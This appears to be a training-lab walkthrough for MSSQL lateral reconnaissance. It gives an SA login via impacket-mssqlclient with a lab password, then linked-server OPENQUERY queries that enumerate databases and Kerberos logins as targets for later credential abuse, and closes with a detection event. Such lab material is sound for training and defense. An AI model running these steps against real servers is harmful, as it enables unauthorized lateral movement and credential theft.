# WT#044 — MSSQL-on-Linux Lateral Reconnaissance (sub-technique)

> **Role:** This is a **reconnaissance sub-technique of the MSSQL lateral-movement chain (WT#040–043)**, not a standalone attack vector. It enumerates linux01 over the linked server (no OS command execution — `xp_cmdshell` is impossible on SQL Server Linux) and hands off to the credential-abuse paths WT#045/WT#046. Counted as part of the MSSQL chain, not as a separate vector.

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.22 (mbr01) → 192.168.77.40 (linux01) |
| **Domain** | child.cadre.local → cadre.local |
| **Starting Credential** | SA: s@_P@ssw0rd!L@b! (via mbr01) |
| **Tools Required** | impacket-mssqlclient |
| **Certifications** | CAPE |
| **MITRE ATT&CK** | T1550.003, T1021.002 (reconnaissance) |
| **Difficulty** | Medium |
| **Classification** | Sub-technique of WT#040–043 (MSSQL chain) — recon, not standalone |

## Prerequisites
- SA access on mbr01 MSSQL instance
- Linked server "LINUX01" configured pointing to linux01 MSSQL (cadre.local)

> **Note — xp_cmdshell unavailable on SQL Server Linux:** The `xpstar.dll` extended stored procedure DLL does not exist in the SQL Server Linux build. `xp_cmdshell` cannot be enabled or executed on linux01. For OS command execution on linux01, pivot to credential abuse paths: WT#045 (SSSD ticket extraction) or WT#046 (keytab abuse).

## Attack Steps

### 1. Connect to mbr01 as SA
```powershell
impacket-mssqlclient child.cadre.local/sa:'s@_P@ssw0rd!L@b!'@192.168.77.22 -windows-auth
```

### 2. Enumerate linked servers
```sql
SELECT srvname, srvproduct, provider FROM master..sysservers;
```

### 3. Reconnaissance via linked server queries
Enumerate linux01 databases, tables, and Kerberos-authenticated logins:
```sql
SELECT * FROM OPENQUERY("LINUX01", 'SELECT @@VERSION');
SELECT * FROM OPENQUERY("LINUX01", 'SELECT name FROM sys.databases');
SELECT * FROM OPENQUERY("LINUX01", 'SELECT name FROM sys.syslogins WHERE isntname = 1');
```

### 4. Identify credential targets
Map discovered logins to known accounts for WT#045/046:
```sql
SELECT * FROM OPENQUERY("LINUX01", 'SELECT name, princid, sid FROM sys.syslogins');
```

## Post-Exploitation Chain
SA on mbr01 (Windows) → Linked server → linux01 database reconnaissance → Identify Kerberos-authenticated logins → Credential abuse (WT#045 SSSD extraction / WT#046 keytab abuse)

## Telemetry Verification
- **Event 5156**: Network connection mbr01 (192.168.77.22) → linux01 (192.168.77.40:1433)

## Status
CONFIGURED
